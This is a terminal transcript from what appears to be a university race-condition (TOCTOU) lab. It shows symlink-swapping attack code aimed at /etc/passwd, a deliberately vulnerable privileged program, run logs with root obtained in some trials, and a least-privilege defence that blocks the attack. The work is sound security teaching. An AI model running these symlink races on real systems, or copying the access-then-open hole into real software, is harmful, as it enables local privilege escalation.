@@ -1,0 +1,196 @@
+Script started on 2026-10-03 05:44:46-04:00 [TERM="xterm-256color" TTY="/dev/pts/1" COLUMNS="80" LINES="24"]
+]0;A — AttackerMember 5: A — Attacker
+Visible desktop automation; full output and scrollback retained.
+Session: 20261003-054443
+Transcript: /home/seed/issd-member5/evidence/automation-20261003-054443/terminal-A.typescript
+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
+/home/seed/issd-member5/lab-files
+2026-10-03T05:44:47-04:00
+seed@VM [A:lab-files]$ [Kseed@VM [A:lab-files]$ printf "Pre-reset diagnostic retry; original failure state retained.\n"; id; timeout 2s ./attack_naive; printf "Diagnostic exit=%s\n" "$?"
+Pre-reset diagnostic retry; original failure state retained.
+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
+Naive switching active; Ctrl+C to stop.
+unlink /tmp/XYZ (check owner and sticky bit): Operation not permitted
+Diagnostic exit=1
+seed@VM [A:lab-files]$ python3 ../automation/lab_runner.py attack ./attack_naive 330 task2b-retry1-20261003-054443
++ id
+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
++ pwd
+/home/seed/issd-member5/lab-files
+Run: task2b-retry1-20261003-054443 | attacker limit: 330s | 2026-10-03T05:59:43.768535-04:00
++ ./attack_naive
+Naive switching active; Ctrl+C to stop.
+symlink /tmp/XYZ (possible root-owned file in the gap): File exists
+Attacker stopped: returncode=1 wall=2.918417s
+Reason: process exited or monitor requested stop
+seed@VM [A:lab-files]$ python3 ../automation/lab_runner.py attack ./attack_naive 330 task2b-retry2-20261003-054443
++ id
+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
++ pwd
+/home/seed/issd-member5/lab-files
+Run: task2b-retry2-20261003-054443 | attacker limit: 330s | 2026-10-03T06:00:47.821212-04:00
++ ./attack_naive
+Naive switching active; Ctrl+C to stop.
+Attacker stopped: returncode=-15 wall=3.351235s
+Reason: process exited or monitor requested stop
+seed@VM [A:lab-files]$ nl -ba attack_atomic.c | sed -n '27,40p'
+    27	    /* Finish initialization BEFORE starting the victim in the other terminal. */
+    28	    if (make_link("/tmp/XYZ", "/dev/null") == -1 ||
+    29	        make_link("/tmp/ABC", "/etc/passwd") == -1)
+    30	        return 1;
+    31	
+    32	    puts("Atomic switching active; Ctrl+C to stop.");
+    33	    fflush(stdout);
+    34	    for (;;) {
+    35	        if (renameat2(AT_FDCWD, "/tmp/XYZ", AT_FDCWD, "/tmp/ABC",
+    36	                      RENAME_EXCHANGE) == -1) {
+    37	            perror("renameat2");
+    38	            return 1;
+    39	        }
+    40	    }
+seed@VM [A:lab-files]$ python3 ../automation/lab_runner.py attack ./attack_atomic 330 task2c-20261003-054443
++ id
+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
++ pwd
+/home/seed/issd-member5/lab-files
+Run: task2c-20261003-054443 | attacker limit: 330s | 2026-10-03T06:05:14.270556-04:00
++ ./attack_atomic
+Atomic switching active; Ctrl+C to stop.
+Attacker stopped: returncode=-15 wall=2.677937s
+Reason: process exited or monitor requested stop
+seed@VM [A:lab-files]$ nl -ba vulp.c | sed -n '28,39p'
+    28	#ifdef LEAST_PRIVILEGE
+    29	    /* Drop BEFORE both the check and the open. Saved UID permits restoration. */
+    30	    if (seteuid(getuid()) == -1) {
+    31	        perror("seteuid: drop");
+    32	        return 1;
+    33	    }
+    34	#endif
+    35	
+    36	    if (access(fn, W_OK) != 0) {
+    37	        puts("No permission");
+    38	        return 1;
+    39	    }
+seed@VM [A:lab-files]$ python3 ../automation/lab_runner.py attack ./attack_atomic 330 task3a-20261003-054443
++ id
+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
++ pwd
+/home/seed/issd-member5/lab-files
+Run: task3a-20261003-054443 | attacker limit: 330s | 2026-10-03T06:07:58.618953-04:00
++ ./attack_atomic
+Atomic switching active; Ctrl+C to stop.
+Attacker stopped: returncode=-15 wall=302.521222s
+Reason: process exited or monitor requested stop
+seed@VM [A:lab-files]$ nl -ba vulp.c | sed -n '28,39p;48,61p;64,70p'
+    28	#ifdef LEAST_PRIVILEGE
+    29	    /* Drop BEFORE both the check and the open. Saved UID permits restoration. */
+    30	    if (seteuid(getuid()) == -1) {
+    31	        perror("seteuid: drop");
+    32	        return 1;
+    33	    }
+    34	#endif
+    35	
+    36	    if (access(fn, W_OK) != 0) {
+    37	        puts("No permission");
+    38	        return 1;
+    39	    }
+    48	    /* Deliberate TOCTOU: pathname is resolved again, after the access check. */
+    49	    fp = fopen(fn, "a+");
+    50	    if (fp == NULL) {
+    51	        perror("Open failed");
+    52	        return 1;
+    53	    }
+    54	    int write_failed = (fwrite("\n", 1, 1, fp) != 1);
+    55	    if (fwrite(buffer, 1, strlen(buffer), fp) != strlen(buffer))
+    56	        write_failed = 1;
+    57	    if (fclose(fp) != 0)
+    58	        write_failed = 1;
+    59	    if (write_failed) {
+    60	        fprintf(stderr, "Write or close failed\n");
+    61	        return 1;
+    64	#ifdef LEAST_PRIVILEGE
+    65	    /* File work is finished. This lab demonstrates temporary privilege drop.
+    66	     * A real app should not restore privilege if no later operation needs it. */
+    67	    if (seteuid(privileged_euid) == -1) {
+    68	        perror("seteuid: restore");
+    69	        return 1;
+    70	    }
+seed@VM [A:lab-files]$ nl -ba attack_atomic.c | sed -n '27,40p'
+    27	    /* Finish initialization BEFORE starting the victim in the other terminal. */
+    28	    if (make_link("/tmp/XYZ", "/dev/null") == -1 ||
+    29	        make_link("/tmp/ABC", "/etc/passwd") == -1)
+    30	        return 1;
+    31	
+    32	    puts("Atomic switching active; Ctrl+C to stop.");
+    33	    fflush(stdout);
+    34	    for (;;) {
+    35	        if (renameat2(AT_FDCWD, "/tmp/XYZ", AT_FDCWD, "/tmp/ABC",
+    36	                      RENAME_EXCHANGE) == -1) {
+    37	            perror("renameat2");
+    38	            return 1;
+    39	        }
+    40	    }
+seed@VM [A:lab-files]$ python3 ../automation/lab_runner.py attack ./attack_atomic 330 task3b-20261003-054443
++ id
+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
++ pwd
+/home/seed/issd-member5/lab-files
+Run: task3b-20261003-054443 | attacker limit: 330s | 2026-10-03T06:16:39.909449-04:00
++ ./attack_atomic
+Atomic switching active; Ctrl+C to stop.
+Attacker stopped: returncode=-15 wall=302.220777s
+Reason: process exited or monitor requested stop
+seed@VM [A:lab-files]$ printf 'Supplemental no-delay Task 2.B run for live S08 capture\n'; nl -ba attack_naive.c | sed -n '7,17p;20,32p'
+Supplemental no-delay Task 2.B run for live S08 capture
+     7	static int point_to(const char *target)
+     8	{
+     9	    if (unlink("/tmp/XYZ") == -1 && errno != ENOENT) {
+    10	        perror("unlink /tmp/XYZ (check owner and sticky bit)");
+    11	        return -1;
+    12	    }
+    13	    if (symlink(target, "/tmp/XYZ") == -1) {
+    14	        perror("symlink /tmp/XYZ (possible root-owned file in the gap)");
+    15	        return -1;
+    16	    }
+    17	    return 0;
+    20	int main(void)
+    21	{
+    22	    if (getuid() == 0 || geteuid() == 0) {
+    23	        fprintf(stderr, "Run this as the ordinary seed user, without sudo.\n");
+    24	        return 1;
+    25	    }
+    26	    puts("Naive switching active; Ctrl+C to stop.");
+    27	    fflush(stdout);
+    28	    for (;;) {
+    29	        if (point_to("/dev/null") == -1 || point_to("/etc/passwd") == -1)
+    30	            return 1;
+    31	    }
+    32	}
+seed@VM [A:lab-files]$ python3 ../automation/lab_runner.py attack ./attack_naive 330 task2b-capture-20261003-054443
++ id
+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
++ pwd
+/home/seed/issd-member5/lab-files
+Run: task2b-capture-20261003-054443 | attacker limit: 330s | 2026-10-03T06:25:13.195398-04:00
++ ./attack_naive
+Naive switching active; Ctrl+C to stop.
+symlink /tmp/XYZ (possible root-owned file in the gap): File exists
+Attacker stopped: returncode=1 wall=3.747722s
+Reason: process exited or monitor requested stop
+seed@VM [A:lab-files]$ id; python3 ../automation/show-results.py | tee ../evidence/automation-20261003-054443/RESULTS_TABLE.txt
+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
+SAVED TRIAL RESULTS — derived from actual logs
+Trial                 Attempts Mon(s)  Wall(s) Observation
+task2b-retry1                9      0    0.533 Sticky-file failure; no target change
+task2b-retry2               20      1    0.865 Record + su/id UID 0 verified
+task2c                       1      0    0.273 Record + su/id UID 0 verified
+task3a                    9455    300  299.996 No target change
+task3b                    9177    300  299.564 No target change
+task2b-capture               2      0    0.379 Sticky-file failure; no target change
+
+Old user log: last progress 76000 attempts / 227s; final totals unknown.
+Mon(s) uses integer SECONDS; Wall(s) includes monitor startup/exit.
+Defence controls: protected writes denied; permitted write succeeded.
+See raw summaries, control logs, actual su/id transcript and PNGs.
+seed@VM [A:lab-files]$ history -a
+seed@VM [A:lab-files]$ 
